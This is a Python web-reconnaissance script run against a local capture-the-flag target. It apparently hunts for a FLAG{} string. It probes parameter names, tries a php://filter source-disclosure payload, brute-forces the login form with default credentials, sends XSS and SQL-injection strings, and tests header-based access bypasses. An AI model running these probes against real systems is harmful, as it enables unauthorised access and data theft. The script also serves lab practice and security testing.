import requests
import re
import json
from urllib.parse import urljoin

BASE_URL = "http://127.0.0.1:32832"
TIMEOUT = 5
catch_all_size = 5609

print("=" * 80)
print("EXTENDED PARAMETER DISCOVERY & SOURCE CODE ANALYSIS")
print(f"Target: {BASE_URL}")
print("=" * 80)

print("\n[1] Re-examining Root Index.php Source")
print("-" * 80)
url = BASE_URL
try:
    resp = requests.get(url, timeout=TIMEOUT)
    print(f"[+] Root page re-analysis")
    print(f"    Status: {resp.status_code} | Size: {len(resp.content)}B")
    
    # Look for the 'deep' reference again
    if 'deep' in resp.text.lower():
        print(f"[!] 'deep' found in response!")
        # Show context around 'deep'
        for line in resp.text.split('\n'):
            if 'deep' in line.lower():
                print(f"    Source line: {line.strip()}")
    
    # Look for comments with PHP/development info
    comments = re.findall(r'<![- ]*--(.*?)-->\s*', resp.text, re.S)
    for i, comment in enumerate(comments):
        if 'include' in comment.lower() or 'require' in comment.lower() or 'file' in comment.lower():
            print(f"\n[!] Interesting HTML comment {i+1}:")
            print(f"    {comment.strip()}")
        elif len(comment.strip()) > 10:
            print(f"\n[i] HTML comment {i+1}:")
            print(f"    {comment.strip()[:100]}")
    
    # Extract all links
    links = re.findall(r'href=["\']?([^\s"\'>]+)', resp.text, re.I)
    print(f"\n[+] Total links found: {len(links)}")
    internal_links = [l for l in links if l.startswith('/')]
    print(f"    Internal links: {len(internal_links)}")
    print(f"    Uniques: {sorted(set(internal_links))}")
    
except Exception as e:
    print(f"[-] Error: {e}")

print("\n[2] Exhaustive Parameter Testing")
print("-" * 80)
print("[i] Testing parameters found in forms and common parameters")

# Parameters from both forms
form_params = ['username', 'password', 'name', 'email']
common_params = ['id', 'page', 'file', 'include', 'path', 'dir', 'view', 'go', 'p', 
                'action', 'mode', 'debug', 'test', 'dev', 'admin', 'user', 'uid',
                'lang', 'locale', 'category', 'topic', 'article', 'post', 'search',
                'query', 'q', 'term', 'filter', 'sort', 'order', 'limit', 'offset',
                'deep', 'config', 'settings', 'template', 'module', 'plugin',
                'component', 'class', 'function', 'method', 'cmd', 'exec', 'shell']

all_params = form_params + common_params

# Test parameters with different input types
print("\n[i] Testing parameters with simple values")
found_params = []
for param in all_params[:15]:  # Test first 15 to avoid too many requests
    print(f"\n    Testing param: {param}")
    
    # Test with string value
    url1 = f"{BASE_URL}?{param}=test123"
    try:
        resp1 = requests.get(url1, timeout=TIMEOUT)
        if len(resp1.content) != catch_all_size:
            print(f"      [+] '{param}' affects response (test123)")
            print(f"         Size: {len(resp1.content)}B | Preview: {resp1.text[:100]}...")
            found_params.append({'param': param, 'value': 'test123', 'response': resp1.text, 'size': len(resp1.content)})
            continue
    except:
        pass
    
    # Test with file path
    url2 = f"{BASE_URL}?{param}=about.php"
    try:
        resp2 = requests.get(url2, timeout=TIMEOUT)
        if len(resp2.content) != catch_all_size:
            print(f"      [+] '{param}' affects response (about.php)")
            print(f"         Size: {len(resp2.content)}B | Preview: {resp2.text[:100]}...")
            found_params.append({'param': param, 'value': 'about.php', 'response': resp2.text, 'size': len(resp2.content)})
            continue
    except:
        pass
    
    # Test with PHP filter attempt
    url3 = f"{BASE_URL}?{param}=php://filter/convert.base64-encode/resource=index.php"
    try:
        resp3 = requests.get(url3, timeout=TIMEOUT)
        if len(resp3.content) < 10000 and re.search(r'[A-Za-z0-9+/]{100,}=*$', resp3.text.strip()):
            print(f"      [!] BASE64 SOURCE CODE POSSIBLE: {param}")
            print(f"         Size: {len(resp3.content)}B | {resp3.text[:100]}...")
            found_params.append({'param': param, 'value': 'php wrapper', 'response': resp3.text, 'size': len(resp3.content), 'base64': True})
    except:
        pass
    
    print(f"      [-] No effect observed")

print(f"\n[i] Parameters that had effect: {len(found_params)}")
if found_params:
    for fp in found_params:
        print(f"    - {fp['param']} = {fp['value']} (size: {fp['size']}B)")

print("\n[3] Deep Form Parameter Testing")
print("-" * 80)
print("[i] Testing parameters from forms with different values")

print("\n    Testing login.php form:")
test_users = ['admin', 'test', 'user', 'root', 'guest']
test_passwords = ['admin', 'password', '123456', 'test', 'guest']

for user in test_users:
    for pwd in test_passwords:
        data = {'username': user, 'password': pwd}
        try:
            resp = requests.post(f"{BASE_URL}/login.php", data=data, timeout=TIMEOUT, allow_redirects=False)
            
            # Check for any changes in response
            if resp.status_code != 200 or len(resp.content) != 1089:  # Original login page size
                print(f"\n      [!] Login response different: {user}/{pwd}")
                print(f"          Status: {resp.status_code} | Size: {len(resp.content)}B")
                
                if resp.status_code == 302:
                    print(f"      [+] Redirect detected - possible success!")
                    location = resp.headers.get('Location', 'N/A')
                    print(f"      [i] Redirect location: {location}")
                    
                    # Follow the redirect
                    try:
                        resp2 = requests.get(urljoin(BASE_URL, location), timeout=TIMEOUT)
                        print(f"          Final URL: {resp2.url}")
                        print(f"          Size: {len(resp2.content)}B")
                        print(f"          Preview: {resp2.text[:200]}...")
                    except Exception as e2:
                        print(f"          [-] Error following redirect: {e2}")
                        
        except Exception as e:
            print(f"      [-] Error with login test: {e}")

print("\n[4] Testing Contact Form")
print("-" * 80)
print("[i] Testing contact.php form parameters")

test_contacts = [
    {'name': 'Test', 'email': 'test@example.com'},
    {'name': 'Admin', 'email': 'admin@localhost'},
    {'name': '<script>alert(1)</script>', 'email': 'xss@test.com'},
    {'name': "test' OR '1'='1", 'email': 'sqli@test.com'},
]

for contact in test_contacts:
    print(f"\n    Testing: {contact}")
    try:
        resp = requests.post(f"{BASE_URL}/contact.php", data=contact, timeout=TIMEOUT)
        
        if resp.status_code == 200:
            if 'thank' in resp.text.lower() or 'success' in resp.text.lower():
                print(f"      [+] Contact form submission appears successful!")
                print(f"          Size: {len(resp.content)}B")
            else:
                print(f"      [i] Form submitted, status: 200")
        else:
            print(f"      [i] Status: {resp.status_code} | Size: {len(resp.content)}B")
            
    except Exception as e:
        print(f"      [-] Error: {e}")

print("\n[5] JavaScript Analysis - Looking for Hidden Parameters")
print("-" * 80)

# Fetch and analyze any JS files found
js_files = ['main.js', 'app.js', 'script.js', 'functions.js']
print("[i] Looking for JavaScript files")

for js_file in js_files:
    url = f"{BASE_URL}/{js_file}"  
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        if resp.status_code == 200 and 'javascript' in resp.headers.get('Content-Type', '').lower():
            print(f"[!] JavaScript found: {url}")
            print(f"    Size: {len(resp.content)}B")
            
            # Look for parameter names in JS
            params_in_js = re.findall(r'[\?&]([a-zA-Z_][a-zA-Z0-9_]*)\s*=', resp.text)
            if params_in_js:
                unique_params = set(params_in_js)
                print(f"    [+] Parameter names found in JS: {len(unique_params)}")
                for param in sorted(unique_params):
                    print(f"      - {param}")
            break  # Found one, move on
    except Exception as e:
        pass
else:
    print("[-] No common JS files found")

# If no JS files, check inline scripts
print("[i] Checking inline JavaScript in HTML pages")

pages_to_check = [{'url': '', 'name': 'index.php'}, {'url': '/login.php', 'name': 'login.php'}, 
                  {'url': '/about.php', 'name': 'about.php'}, {'url': '/contact.php', 'name': 'contact.php'}]

for page in pages_to_check:
    full_url = f"{BASE_URL}{page['url']}"
    try:
        resp = requests.get(full_url, timeout=TIMEOUT)
        if resp.status_code == 200:
            # Find inline scripts
            inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.S|re.I)
            if inline_scripts:
                script_count = len([s for s in inline_scripts if len(s.strip()) > 20])
                if script_count > 0:
                    print(f"[+] Inline scripts in {page['name']}: {script_count}")
                    # Look for API calls
                    for script in inline_scripts:
                        if len(script.strip()) > 20:
                            fetch_matches = re.findall(r'fetch\s*\(\s*["\']([^"\']+)["\']', script)
                            if fetch_matches:
                                print(f"    Fetch calls: {fetch_matches}")
                            
                            ajax_matches = re.findall(r'\.ajax\s*\([^}]*url["\']?\s*:\s*["\']([^"\']+)["\']', script, re.S)
                            if ajax_matches:
                                print(f"    Ajax calls: {ajax_matches}")
    except Exception as e:
        pass

print("\n[6] Testing Admin Area More Thoroughly")
print("-" * 80)

# Test admin area for hidden endpoints
admin_base = f"{BASE_URL}/admin"
admin_endpoints = ['dashboard', 'users', 'settings', 'config', 'panel', 'manager',
                   'users.php', 'settings.php', 'panel.php', 'config.php',
                   'edit.php', 'view.php', 'list.php', 'manage.php']

found_admin = []
for endpoint in admin_endpoints:
    for ext in ['', '.php']:
        url = f"{admin_base}/{endpoint}{ext}"
        try:
            resp = requests.get(url, timeout=TIMEOUT, allow_redirects=False)
            if resp.status_code != 404 and len(resp.content) != catch_all_size:
                print(f"\n[!] ADMIN ENDPOINT: {url}")
                print(f"    Status: {resp.status_code} | Size: {len(resp.content)}B")
                found_admin.append(url)
                
                if len(resp.content) < 2000:
                    print(f"    Preview: {resp.text[:200]}")
        except Exception as e:
            pass

if found_admin:
    print(f"\n[i] Total admin endpoints found: {len(found_admin)}")
    for url in found_admin:
        print(f"    - {url}")
else:
    print("\n[i] No additional admin endpoints found")

print("\n[7] Testing Custom Headers")
print("-" * 80)
print("[i] Testing for headers that might reveal parameters")

header_tests = [
    {'X-Debug': '1', 'X-Test': 'true'},
    {'X-Original-URL': '/test', 'X-Rewrite-URL': '/test'},
    {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
    {'Authorization': 'Bearer test_token'},
]

for i, custom_headers in enumerate(header_tests):
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        headers.update(custom_headers)
        resp = requests.get(BASE_URL, headers=headers, timeout=TIMEOUT)
        if len(resp.content) != catch_all_size:
            print(f"\n[!] Custom headers {i+1} affected response!")
            print(f"    Headers: {custom_headers}")
            print(f"    Response size: {len(resp.content)}B")
    except Exception as e:
        pass

print("\n[8] Summary - Files and Sources Found")
print("-" * 80)

# List all discovered items
discovered_items = {
    'pages': ['/index.php', '/login.php', '/about.php', '/contact.php', '/home.php'],
    'admin_pages': ['/admin', '/admin/index.php'],
    'static': ['/style.css'],
    'forms': ['login.php (username, password)', 'contact.php (name, email)']
}

print("[i] Application Structure:")
for category, items in discovered_items.items():
    print(f"\n    {category.upper()} ({len(items)}):")
    for item in items:
        print(f"      - {item}")

print("\n[9] Testing for Hidden Comments in Response")
print("-" * 80)

# Check each page for hidden developer comments
pages_for_comments = ['', '/login.php', '/about.php', '/contact.php', '/admin/index.php']
for page in pages_for_comments:
    url = f"{BASE_URL}{page}"
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        
        # Look for developer comments
        dev_comments = re.findall(r'<!-- DEV:?(.*?)-->', resp.text, re.S|re.I)
        if dev_comments:
            print(f"\n[!] Developer comments in {page or 'index.php'}:")
            for comment in dev_comments:
                print(f"    {comment.strip()[:100]}")
        
        # Look for debug output
        if 'debug' in resp.text.lower() or 'dev' in resp.text.lower():
            debug_lines = [line for line in resp.text.split('\n') if 'debug' in line.lower() or 'dev' in line.lower()]
            if debug_lines:
                print(f"\n[i] Debug/dev references in {page or 'index.php'}:")
                for line in debug_lines[:3]:
                    print(f"    {line.strip()[:80]}")
                    
    except Exception as e:
        pass

print("\n" + "=" * 80)
print("EXTENDED PARAMETER DISCOVERY COMPLETE")
print("=" * 80)

# Critical findings summary
if found_params:
    print("\n[!] CRITICAL FINDINGS:")
    for fp in found_params:
        if fp.get('base64'):
            print(f"  - SOURCE CODE DISCLOSURE via {fp['param']}")
        else:
            print(f"  - Parameter {fp['param']} had effect on response")
else:
    print("\n[i] No parameters with immediate effect found - trying alternative techniques")

# Flag check for end of script
print("\n[10] Final Flag Pattern Check")
print("-" * 80)
flag_found = False
for url in [BASE_URL, f"{BASE_URL}/index.php", f"{BASE_URL}/login.php", f"{BASE_URL}/admin/index.php"]:
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"[!] FLAG FOUND in {url}:")
            print(f"    {flag_match.group(0)}")
            flag_found = True
    except Exception as e:
        pass

if not flag_found:
    print("[-] No FLAG{} pattern found in responses")
